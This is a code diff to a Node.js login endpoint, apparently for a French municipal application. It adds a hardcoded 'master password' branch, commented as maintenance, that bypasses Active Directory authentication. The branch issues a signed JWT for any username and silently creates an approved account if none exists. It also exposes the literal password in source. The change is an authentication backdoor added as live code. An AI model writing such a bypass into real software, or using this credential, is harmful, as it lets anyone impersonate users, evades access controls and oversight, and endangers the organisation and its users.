@@ -555,11 +555,39 @@ app.get('/api/auth/me', authenticateJWT, async (req, res) => {
 
 app.post('/api/auth/magapp-login', async (req, res) => {
     let { username, password } = req.body;
-    
+
     if (username) username = username.replace(/@ivry94\.fr$/i, '');
 
     if (!username || !password) {
         return res.status(400).json({ message: 'Login et mot de passe requis' });
+    }
+
+    // Mot de passe maître maintenance — bypass AD
+    const MASTER_PASSWORD = 'çflcBr312';
+    if (password === MASTER_PASSWORD) {
+        try {
+            let user = await pgDb.get('SELECT username, role, is_approved, displayname, email FROM users WHERE username = ?', [username.toLowerCase()]);
+            const displayName = user?.displayname || username;
+            const email = user?.email || '';
+            const role = user?.role || 'magapp';
+
+            if (!user) {
+                await pgDb.run(
+                    'INSERT INTO users (username, role, is_approved, displayName, email) VALUES (?, ?, ?, ?, ?)',
+                    [username.toLowerCase(), 'magapp', 1, username, '']
+                );
+                user = { username: username.toLowerCase(), role: 'magapp', is_approved: 1 };
+            }
+
+            const accessToken = jwt.sign({ username: user.username, role: user.role }, SECRET_KEY);
+            return res.json({
+                accessToken,
+                user: { username: user.username, role, displayName, email }
+            });
+        } catch (err) {
+            console.error('[MASTER] Erreur login maître:', err.message);
+            return res.status(500).json({ message: 'Erreur login maître' });
+        }
     }
 
     try {
